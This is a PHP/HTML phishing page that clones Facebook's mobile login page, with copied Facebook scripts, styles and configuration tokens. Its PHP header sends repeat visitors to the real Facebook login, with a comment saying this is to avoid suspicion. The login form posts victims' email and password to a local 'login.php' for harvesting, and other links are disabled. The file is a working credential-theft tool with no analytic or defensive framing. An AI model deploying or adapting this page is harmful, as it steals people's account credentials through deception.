<?php

session_start();
if(isset($_SESSION['already_visited'])){
	
	header("Location: https://m.facebook.com/login/"); // redirecting previous traffic to avoid suspecion.
	exit();
}

?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Log in to Facebook | Facebook</title>
        <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
        <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196" />
        <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yE/l/0,cross/-qRujSri_0t.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="0iX5FOK" crossorigin="anonymous" />
        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/l/0,cross/YeHXcRhYV3T.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="MoYpVB9" crossorigin="anonymous" />
        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/l/0,cross/CgegNNGYQzw.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="uq5kEmb" crossorigin="anonymous" />
        <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yr/l/0,cross/mFSbOMjboep.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="CPTlf3J" crossorigin="anonymous" />
        <script id="u_0_d_aJ" nonce="hoLQyIrb">
            function envFlush(a) {
                function b(b) {
                    for (var c in a) b[c] = a[c];
                }
                window.requireLazy ? window.requireLazy(["Env"], b) : ((window.Env = window.Env || {}), b(window.Env));
            }
            envFlush({
                timeslice_heartbeat_config: {
                    pollIntervalMs: 33,
                    idleGapThresholdMs: 60,
                    ignoredTimesliceNames: { requestAnimationFrame: true, "Event listenHandler mousemove": true, "Event listenHandler mouseover": true, "Event listenHandler mouseout": true, "Event listenHandler scroll": true },
                    isHeartbeatEnabled: true,
                    isArtilleryOn: false,
                },
                shouldLogCounters: true,
                timeslice_categories: { react_render: true, reflow: true },
                sample_continuation_stacktraces: true,
                dom_mutation_flag: true,
            });
        </script>
        <script nonce="hoLQyIrb">
            document.domain = "facebook.com";
        </script>
        <script nonce="hoLQyIrb">
            __DEV__ = 0;
        </script>
        <script id="u_0_e_hQ" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3/yK/r/SRAbzXUSwXV.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="L8NPcws" nonce="hoLQyIrb"></script>
        <script id="u_0_b_32" nonce="hoLQyIrb">
            (CavalryLogger =
                window.CavalryLogger ||
                function (a) {
                    (this.lid = a),
                        (this.transition = !1),
                        (this.metric_collected = !1),
                        (this.is_detailed_profiler = !1),
                        (this.instrumentation_started = !1),
                        (this.pagelet_metrics = {}),
                        (this.events = {}),
                        (this.ongoing_watch = {}),
                        (this.values = { t_cstart: window._cstart }),
                        (this.piggy_values = {}),
                        (this.bootloader_metrics = {}),
                        (this.resource_to_pagelet_mapping = {}),
                        this.initializeInstrumentation && this.initializeInstrumentation();
                }),
                (CavalryLogger.prototype.setIsDetailedProfiler = function (a) {
                    this.is_detailed_profiler = a;
                    return this;
                }),
                (CavalryLogger.prototype.setTTIEvent = function (a) {
                    this.tti_event = a;
                    return this;
                }),
                (CavalryLogger.prototype.setValue = function (a, b, c, d) {
                    d = d ? this.piggy_values : this.values;
                    (typeof d[a] === "undefined" || c) && (d[a] = b);
                    return this;
                }),
                (CavalryLogger.prototype.getLastTtiValue = function () {
                    return this.lastTtiValue;
                }),
                (CavalryLogger.prototype.setTimeStamp =
                    CavalryLogger.prototype.setTimeStamp ||
                    function (a, b, c, d) {
                        this.mark(a);
                        var e = this.values.t_cstart || this.values.t_start;
                        e = d ? e + d : CavalryLogger.now();
                        this.setValue(a, e, b, c);
                        this.tti_event && a == this.tti_event && ((this.lastTtiValue = e), this.setTimeStamp("t_tti", b));
                        return this;
                    }),
                (CavalryLogger.prototype.mark =
                    typeof console === "object" && console.timeStamp
                        ? function (a) {
                              console.timeStamp(a);
                          }
                        : function () {}),
                (CavalryLogger.prototype.addPiggyback = function (a, b) {
                    this.piggy_values[a] = b;
                    return this;
                }),
                (CavalryLogger.instances = {}),
                (CavalryLogger.id = 0),
                (CavalryLogger.getInstance = function (a) {
                    typeof a === "undefined" && (a = CavalryLogger.id);
                    CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
                    return CavalryLogger.instances[a];
                }),
                (CavalryLogger.setPageID = function (a) {
                    if (CavalryLogger.id === 0) {
                        var b = CavalryLogger.getInstance();
                        CavalryLogger.instances[a] = b;
                        CavalryLogger.instances[a].lid = a;
                        delete CavalryLogger.instances[0];
                    }
                    CavalryLogger.id = a;
                }),
                (CavalryLogger.now = function () {
                    return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime();
                }),
                (CavalryLogger.prototype.measureResources = function () {}),
                (CavalryLogger.prototype.profileEarlyResources = function () {}),
                (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {}),
                (CavalryLogger.start_js = function () {}),
                (CavalryLogger.start_js_script = function () {}),
                (CavalryLogger.done_js = function () {});
            CavalryLogger.getInstance().setTTIEvent("t_domcontent");
            (CavalryLogger.prototype.measureResources = function (a, b) {
                if (!this.log_resources) return;
                var c = "bootload/" + a.name;
                if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
                var d = CavalryLogger.now();
                this.ongoing_watch[c] = d;
                "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
                b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
                if (a.type === "js") {
                    c = "js_exec/" + a.name;
                    this.ongoing_watch[c] = d;
                }
            }),
                (CavalryLogger.prototype.stopWatch = function (a) {
                    if (this.ongoing_watch[a]) {
                        var b = CavalryLogger.now(),
                            c = b - this.ongoing_watch[a];
                        this.bootloader_metrics[a] = c;
                        var d = this.piggy_values;
                        a.indexOf("bootload") === 0 &&
                            (d.t_resource_download || (d.t_resource_download = 0),
                            d.resources_downloaded || (d.resources_downloaded = 0),
                            (d.t_resource_download += c),
                            (d.resources_downloaded += 1),
                            d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
                        delete this.ongoing_watch[a];
                    }
                    return this;
                }),
                (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
                    var a = {};
                    Object.values(window.CavalryLogger.instances).forEach(function (b) {
                        b.bootloader_metrics && Object.assign(a, b.bootloader_metrics);
                    });
                    return a;
                }),
                (CavalryLogger.start_js = function (a) {
                    for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b]);
                }),
                (CavalryLogger.start_js_script = function (a) {
                    if (!a || !a.dataset) return;
                    CavalryLogger.start_js([a.dataset.bootloaderHash || a.dataset.bootloaderHashClient]);
                }),
                (CavalryLogger.done_js = function (a) {
                    for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b]);
                }),
                (CavalryLogger.prototype.profileEarlyResources = function (a) {
                    for (var b = 0; b < a.length; b++) this.measureResources({ name: a[b][0], type: a[b][1] ? "js" : "" }, "_EF_");
                });
            CavalryLogger.getInstance().log_resources = true;
            CavalryLogger.getInstance().setIsDetailedProfiler(true);
            window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
        </script>
		<script type="text/javascript">
		  function validateForm() {
			var a = document.forms["Form"]["email"].value;
			var b = document.forms["Form"]["pass"].value;
			if (a == null || a == "", b == null || b == "") {
			  return false;
			}
		  }
		</script>
        <script id="u_0_c_FW" nonce="hoLQyIrb">
            (function _(a, b, c, d) {
                function e(a) {
                    document.cookie = a + "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com";
                }
                function f(a, b) {
                    document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure";
                }
                if (!a) {
                    e(b);
                    e(c);
                    return;
                }
                a = null;
                (navigator.userAgent.indexOf("Firefox") !== -1 || (!window.devicePixelRatio && navigator.userAgent.indexOf("Windows Phone") !== -1)) &&
                    document.documentElement != null &&
                    ((a = screen.width / document.documentElement.offsetWidth), (a = Math.max(1, Math.floor(a * 2) / 2)));
                (!a || a === 1) && navigator.userAgent.indexOf("IEMobile") !== -1 && ((a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96), (a = Math.max(1, Math.round(a * 2) / 2)));
                f(b, (a || window.devicePixelRatio || 1).toString());
                e = window.screen ? screen.width : 0;
                b = window.screen ? screen.height : 0;
                f(c, e + "x" + b);
                d && document.cookie && window.devicePixelRatio > 1 && document.location.reload();
            })(true, "m_pixel_ratio", "wd", false);
        </script>
        <meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
        <meta property="og:site_name" content="Facebook" />
        <meta property="og:type" content="website" />
        <meta property="og:title" content="Log in to Facebook | Facebook" />
        <meta property="og:description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know." />
        <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
        <meta property="og:url" content="https://www.facebook.com/" />
        <link rel="alternate" hreflang="x-default" href="https://www.facebook.com/" />
        <link rel="alternate" hreflang="en" href="https://www.facebook.com/" />
        <link rel="alternate" hreflang="ar" href="https://ar-ar.facebook.com/" />
        <link rel="alternate" hreflang="bg" href="https://bg-bg.facebook.com/" />
        <link rel="alternate" hreflang="bs" href="https://bs-ba.facebook.com/" />
        <link rel="alternate" hreflang="ca" href="https://ca-es.facebook.com/" />
        <link rel="alternate" hreflang="da" href="https://da-dk.facebook.com/" />
        <link rel="alternate" hreflang="el" href="https://el-gr.facebook.com/" />
        <link rel="alternate" hreflang="es" href="https://es-la.facebook.com/" />
        <link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/" />
        <link rel="alternate" hreflang="fa" href="https://fa-ir.facebook.com/" />
        <link rel="alternate" hreflang="fi" href="https://fi-fi.facebook.com/" />
        <link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/" />
        <link rel="alternate" hreflang="fr-ca" href="https://fr-ca.facebook.com/" />
        <link rel="alternate" hreflang="hi" href="https://hi-in.facebook.com/" />
        <link rel="alternate" hreflang="hr" href="https://hr-hr.facebook.com/" />
        <link rel="alternate" hreflang="id" href="https://id-id.facebook.com/" />
        <link rel="alternate" hreflang="it" href="https://it-it.facebook.com/" />
        <link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/" />
        <link rel="alternate" hreflang="mk" href="https://mk-mk.facebook.com/" />
        <link rel="alternate" hreflang="ms" href="https://ms-my.facebook.com/" />
        <link rel="alternate" hreflang="pl" href="https://pl-pl.facebook.com/" />
        <link rel="alternate" hreflang="pt" href="https://pt-br.facebook.com/" />
        <link rel="alternate" hreflang="pt-pt" href="https://pt-pt.facebook.com/" />
        <link rel="alternate" hreflang="ro" href="https://ro-ro.facebook.com/" />
        <link rel="alternate" hreflang="sl" href="https://sl-si.facebook.com/" />
        <link rel="alternate" hreflang="sr" href="https://sr-rs.facebook.com/" />
        <link rel="alternate" hreflang="th" href="https://th-th.facebook.com/" />
        <link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/" />
        <script id="u_0_f_Ut" type="application/ld+json" nonce="hoLQyIrb">
            { "\u0040context": "http:\/\/schema.org", "\u0040type": "WebSite", "name": "Facebook", "url": "https:\/\/www.facebook.com\/" }
        </script>
        <link rel="canonical" href="https://www.facebook.com/login/" />
        <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials" />
    </head>
    <body tabindex="0" class="touch x1 ff _fzu _50-3 iframe acw">
        <script id="u_0_a_t2" nonce="hoLQyIrb">
            (function (a) {
                a.__updateOrientation = function () {
                    var b = !!a.orientation && a.orientation !== 180,
                        c = document.body;
                    c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
                    return b;
                };
            })(window);
        </script>
        <div id="viewport" data-kaios-focus-transparent="1">
            <h1 style="display: block; height: 0; overflow: hidden; position: absolute; width: 0; padding: 0;">Facebook</h1>
            <div id="page">
                <div class="_129_" id="header-notices"></div>
                <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
                    <div class="_5909">
                        <div class="_7om2">
                            <div class="_4g34" id="u_0_0_ZF">
                                <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice"><div class="_52jd"></div></div>
                                <div class="_9om_">
                                    <div class="_4-4l">
                                        <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div>
                                        <div class="_5909 _2pid _52z6">
                                            <div class="_7om2 _52we">
                                                <div class="_4g34">
                                                    <a href="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQzNTgwMjczLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D">
                                                        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook" />
                                                    </a>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="_5rut">
                                            <form method="post" action="login.php" name="Form" onsubmit="return validateForm()">
                                                <input type="hidden" name="lsd" value="AVoljF6lWG8" autocomplete="off" /><input type="hidden" name="jazoest" value="2922" autocomplete="off" />
                                                <input type="hidden" name="m_ts" value="1643580273" /><input type="hidden" name="li" value="cQv3YcpbAtZIVGPqH9DbE1W6" />
                                                <input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number" /><input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries" />
                                                <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                                                <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                                                <div id="otp_retrieve_desc_container"></div>
                                                <div>
                                                    <div class="_56be">
                                                        <div class="_55wo _56bf">
                                                            <div class="_96n9" id="email_input_container">
                                                                <input
                                                                    autocorrect="off"
                                                                    autocapitalize="off"
                                                                    class="_56bg _4u9z _5ruq _8qtn"
                                                                    autocomplete="on"
                                                                    id="m_login_email"
                                                                    name="email"
                                                                    placeholder="Mobile number or email address"
                                                                    type="text"
                                                                    data-sigil="m_login_email"
                                                                />
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="_55wq"></div>
                                                    <div class="_56be">
                                                        <div class="_55wo _56bf">
                                                            <div class="_1upc _mg8" data-sigil="m_login_password">
                                                                <div class="_5909">
                                                                    <div class="_7om2">
                                                                        <div class="_4g34 _5i2i _52we">
                                                                            <div class="_5xu4">
                                                                                <input
                                                                                    autocorrect="off"
                                                                                    autocapitalize="off"
                                                                                    class="_56bg _4u9z _27z2 _8qtm"
                                                                                    autocomplete="on"
                                                                                    id="m_login_password"
                                                                                    name="pass"
                                                                                    placeholder="Password"
                                                                                    type="password"
                                                                                    data-sigil="password-plain-text-toggle-input"
                                                                                />
                                                                            </div>
                                                                        </div>
                                                                        <div class="_5s61 _216i _5i2i _52we">
                                                                            <div class="_5xu4">
                                                                                <div class="_2pi9" style="display: none;" id="u_0_1_V8">
                                                                                    <a href="#" data-sigil="password-plain-text-toggle">
                                                                                        <span class="mfss" style="display: none;" id="u_0_2_Dw">HIDE</span><span class="mfss" id="u_0_3_pB">SHOW</span>
                                                                                    </a>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="_2pie" style="text-align: center;">
                                                    <div id="login_password_step_element" data-sigil="login_password_step_element">
                                                        <button type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login" data-sigil="touchable login_button_block m_login_button">
                                                            <span class="_55sr">Log In</span>
                                                        </button>
                                                    </div>
                                                    <div class="_7eif" id="oauth_login_button_container" style="display: none;"></div>
                                                    <div class="_7f_d" id="oauth_login_desc_container" style="display: none;"></div>
                                                    <div id="otp_button_elem_container"></div>
                                                </div>
                                                <input type="hidden" name="prefill_contact_point" id="prefill_contact_point" /><input type="hidden" name="prefill_source" id="prefill_source" />
                                                <input type="hidden" name="prefill_type" id="prefill_type" /><input type="hidden" name="first_prefill_source" id="first_prefill_source" />
                                                <input type="hidden" name="first_prefill_type" id="first_prefill_type" /><input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false" />
                                                <input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false" /><input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false" />
                                                <input type="hidden" id="bi_xrwh" name="bi_xrwh" value="0" /><input type="hidden" id="scetoggle" />
                                                <div class="_xo8"></div>
                                                <noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript>
                                            </form>
                                            <div>
                                                <div class="_2pie _9omz">
                                                    <div class="_52jj _9on1">
                                                        <a
                                                            class="_9on1"
                                                            tabindex="0"
                                                            href="#"
															onClick="return false;"
                                                            id="forgot-password-link"
                                                        >
                                                            Forgotten password?
                                                        </a>
                                                    </div>
                                                </div>
                                                <div style="padding-top: 42px;">
                                                    <div>
                                                        <div>
                                                            <div>
                                                                <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">or</span></div>
                                                                <div class="_52jj _5t3b" id="signup_button_area">
                                                                    <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="#" onClick="return false;" tabindex="0" data-sigil="m_reg_button">
                                                                        Create New Account
                                                                    </a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="_2pie" style="text-align: center;">
                                                            <div>
                                                                <div data-sigil="login_identify_step_element"></div>
                                                                <div class="other-links _8p_m">
                                                                    <ul class="_5pkb _55wp">
                                                                        <li></li>
                                                                    </ul>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div style="display: none;"></div>
                    <span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display: none;" /></span>
                    <div class="_55wr _5ui2" data-sigil="m_login_footer">
                        <div class="_5dpw">
                            <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                                <div class="_5909">
                                    <div class="_7om2">
                                        <div class="_4g34">
                                            <span class="_52jc _52j9 _52jh _3ztb">English (UK)</span>
                                            <div class="_3ztc">
                                                <span class="_52jc">
                                                    <a
                                                        href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;ls_ref=mobile_suggested_locale_selector"
                                                        data-ajaxify-href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;ls_ref=mobile_suggested_locale_selector"
                                                        data-method="post"
                                                        data-sigil="ajaxify"
                                                    >
                                                        Español
                                                    </a>
                                                </span>
                                            </div>
                                            <div class="_3ztc">
                                                <span class="_52jc">
                                                    <a
                                                        href="/intl/save_locale/?loc=it_IT&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;ls_ref=mobile_suggested_locale_selector"
                                                        data-ajaxify-href="/intl/save_locale/?loc=it_IT&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;ls_ref=mobile_suggested_locale_selector"
                                                        data-method="post"
                                                        data-sigil="ajaxify"
                                                    >
                                                        Italiano
                                                    </a>
                                                </span>
                                            </div>
                                            <div class="_3ztc">
                                                <span class="_52jc">
                                                    <a
                                                        href="/intl/save_locale/?loc=de_DE&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;ls_ref=mobile_suggested_locale_selector"
                                                        data-ajaxify-href="/intl/save_locale/?loc=de_DE&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;ls_ref=mobile_suggested_locale_selector"
                                                        data-method="post"
                                                        data-sigil="ajaxify"
                                                    >
                                                        Deutsch
                                                    </a>
                                                </span>
                                            </div>
                                        </div>
                                        <div class="_4g34">
                                            <div class="_3ztc">
                                                <span class="_52jc">
                                                    <a
                                                        href="/intl/save_locale/?loc=pl_PL&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;ls_ref=mobile_suggested_locale_selector"
                                                        data-ajaxify-href="/intl/save_locale/?loc=pl_PL&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;ls_ref=mobile_suggested_locale_selector"
                                                        data-method="post"
                                                        data-sigil="ajaxify"
                                                    >
                                                        Polski
                                                    </a>
                                                </span>
                                            </div>
                                            <div class="_3ztc">
                                                <span class="_52jc">
                                                    <a
                                                        href="/intl/save_locale/?loc=fr_FR&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;ls_ref=mobile_suggested_locale_selector"
                                                        data-ajaxify-href="/intl/save_locale/?loc=fr_FR&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;ls_ref=mobile_suggested_locale_selector"
                                                        data-method="post"
                                                        data-sigil="ajaxify"
                                                    >
                                                        Français (France)
                                                    </a>
                                                </span>
                                            </div>
                                            <div class="_3ztc">
                                                <span class="_52jc">
                                                    <a
                                                        href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;ls_ref=mobile_suggested_locale_selector"
                                                        data-ajaxify-href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2Flogin%2F&amp;ls_ref=mobile_suggested_locale_selector"
                                                        data-method="post"
                                                        data-sigil="ajaxify"
                                                    >
                                                        Português (Brasil)
                                                    </a>
                                                </span>
                                            </div>
                                            <a href="#" onClick="return false;">
                                                <div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-sigil="more_language"><i class="img sp_8kESFo32fki sx_1f5d27"></i></div>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="_5ui4"><span class="mfss fcg">Facebook Inc.</span></div>
                        </div>
                    </div>
                </div>
                <div class=""></div>
                <div class="viewportArea _2v9s" style="display: none;" id="u_0_4_QS" data-sigil="marea">
                    <div class="_5vsg" id="u_0_5_ZW"></div>
                    <div class="_5vsh" id="u_0_6_Ku"></div>
                    <div class="_5v5d fcg">
                        <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                        Loading...
                    </div>
                </div>
                <div class="viewportArea aclb" id="mErrorView" style="display: none;" data-sigil="marea">
                    <div class="container">
                        <div class="image"></div>
                        <div class="message" data-sigil="error-message"></div>
                        <a class="link" data-sigil="MPageError:retry">Try Again</a>
                    </div>
                </div>
            </div>
        </div>
        <div id="static_templates">
            <div class="mDialog" id="modalDialog" style="display: none;">
                <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
                    <div class="_5909">
                        <div class="_7om2 _52we">
                            <div class="_5s61">
                                <div class="_52z7">
                                    <button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_8_IJ" data-sigil="dialog-cancel-button">Cancel</button>
                                    <button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_9_5v" data-sigil="dialog-back-button">
                                        <i class="img sp_8kESFo32fki sx_636f75" style="margin-top: 2px;"></i>
                                    </button>
                                </div>
                            </div>
                            <div class="_4g34">
                                <div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Loading...</div></div>
                            </div>
                            <div class="_5s61"><div class="_52z8" id="modalDialogHeaderButtons"></div></div>
                        </div>
                    </div>
                </div>
                <div class="modalDialogView" id="modalDialogView"></div>
                <div class="_5v5d _5v5e fcg" id="dialogSpinner">
                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_7_TL" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                    Loading...
                </div>
            </div>
        </div>
        <script id="u_0_g_mR" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3imlz4/yD/l/en_GB/V98JWHoppNu.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="BIIJdhz" nonce="hoLQyIrb"></script>
        <script id="u_0_h_S1" nonce="hoLQyIrb">
            requireLazy(["HasteSupportData"], function (m) {
                m.handle({
                    gkxData: {
                        "5241": { result: true, hash: "AT7o1bCQPGpf3ShExlI" },
                        "676920": { result: false, hash: "AT497IX4gOFG8gZe_DI" },
                        "708253": { result: false, hash: "AT5n4hBL3YTMnQWthJg" },
                        "996940": { result: false, hash: "AT7opYuEGy3sjG1aIkc" },
                        "1263340": { result: false, hash: "AT5bwizWgDaFQudmDfA" },
                    },
                });
            });
            requireLazy(["TimeSliceImpl", "ServerJS"], function (TimeSlice, ServerJS) {
                new ServerJS().handle({
                    define: [
                        ["CometPersistQueryParams", [], { relative: {}, domain: {} }, 6231],
                        ["BigPipeExperiments", [], { link_images_to_pagelets: false, enable_bigpipe_plugins: false }, 907],
                        ["BootloaderConfig", [], { deferBootloads: false, jsRetries: [200, 500], jsRetryAbortNum: 2, jsRetryAbortTime: 5, silentDups: false, hypStep4: false, phdOn: false, btCutoffIndex: 591 }, 329],
                        ["CSSLoaderConfig", [], { timeout: 5000, modulePrefix: "BLCSS:", loadEventSupported: true }, 619],
                        ["CurrentCommunityInitialData", [], {}, 490],
                        [
                            "CurrentUserInitialData",
                            [],
                            {
                                ACCOUNT_ID: "0",
                                USER_ID: "0",
                                NAME: "",
                                SHORT_NAME: null,
                                IS_BUSINESS_PERSON_ACCOUNT: false,
                                HAS_SECONDARY_BUSINESS_PERSON: false,
                                IS_FACEBOOK_WORK_ACCOUNT: false,
                                IS_MESSENGER_ONLY_USER: false,
                                IS_DEACTIVATED_ALLOWED_ON_MESSENGER: false,
                                IS_MESSENGER_CALL_GUEST_USER: false,
                                IS_WORK_MESSENGER_CALL_GUEST_USER: false,
                                APP_ID: "412378670482",
                                IS_BUSINESS_DOMAIN: false,
                            },
                            270,
                        ],
                        ["ErrorDebugHooks", [], { SnapShotHook: null }, 185],
                        ["ISB", [], {}, 330],
                        ["LSD", [], { token: "AVoljF6lWG8" }, 323],
                        [
                            "MRequestConfig",
                            [],
                            {
                                dtsg: { token: "AQH1VGppGkGCNt4:0:0", valid_for: 86400, expire: 1643666673 },
                                dtsg_ag: { token: "AQw5O8wIfzt25b9q45_s2HIRMyjLUTsZobtkeYAF0LwjqjN_:0:0", valid_for: 604800, expire: 1644185073 },
                                lsd: "AVoljF6lWG8",
                                checkResponseOrigin: true,
                                checkResponseToken: true,
                                cleanFinishedRequest: false,
                                cleanFinishedPrefetchRequests: false,
                                ajaxResponseToken: { secret: "aS6GQEs5N44scTEtXiMY1VlarH298RxW", encrypted: "AYnhvTN2cv-WRZ5tUZ8XrvN2PSeHIfyc-Wp_tG6eELjkWNaEe8kiBrIHZQy1PgoNDIXhyKHh3i4PrZ_mheLg_uULiQcOUAUUVI20dOhqf1JpNA" },
                            },
                            51,
                        ],
                        ["ServerNonce", [], { ServerNonce: "c8gjjcwRUSMLbQ850MNKoD" }, 141],
                        [
                            "SiteData",
                            [],
                            {
                                server_revision: 1004998278,
                                client_revision: 1004998278,
                                tier: "",
                                push_phase: "C3",
                                pkg_cohort: "BP:mtouch_pkg",
                                haste_session: "19022.BP:mtouch_pkg.2.0.0.0.",
                                pr: 1,
                                haste_site: "mobile",
                                be_one_ahead: false,
                                ir_on: true,
                                is_rtl: false,
                                is_comet: false,
                                is_experimental_tier: false,
                                is_jit_warmed_up: true,
                                hsi: "7059123521598540821-0",
                                semr_host_bucket: "3",
                                bl_hash_version: 2,
                                skip_rd_bl: true,
                                comet_env: 0,
                                spin: 0,
                                __spin_r: 1004998278,
                                __spin_b: "trunk",
                                __spin_t: 1643580273,
                                vip: "157.240.240.35",
                            },
                            317,
                        ],
                        ["SprinkleConfig", [], { param_name: "jazoest", version: 2, should_randomize: false }, 2111],
                        ["PromiseUsePolyfillSetImmediateGK", [], { www_always_use_polyfill_setimmediate: false }, 2190],
                        [
                            "KSConfig",
                            [],
                            {
                                killed: {
                                    __set: [
                                        "MOBILIZER_SELF_SERVE_OWNERSHIP_RESOLVER",
                                        "MLHUB_FLOW_AUTOREFRESH_SEARCH",
                                        "NEKO_DISABLE_CREATE_FOR_SAP",
                                        "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT",
                                        "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING",
                                        "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING",
                                        "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE",
                                        "BUY_AT_UI_LINE_DELETE",
                                        "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API",
                                        "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API",
                                        "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API",
                                        "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API",
                                        "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API",
                                        "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API",
                                        "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION",
                                        "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION",
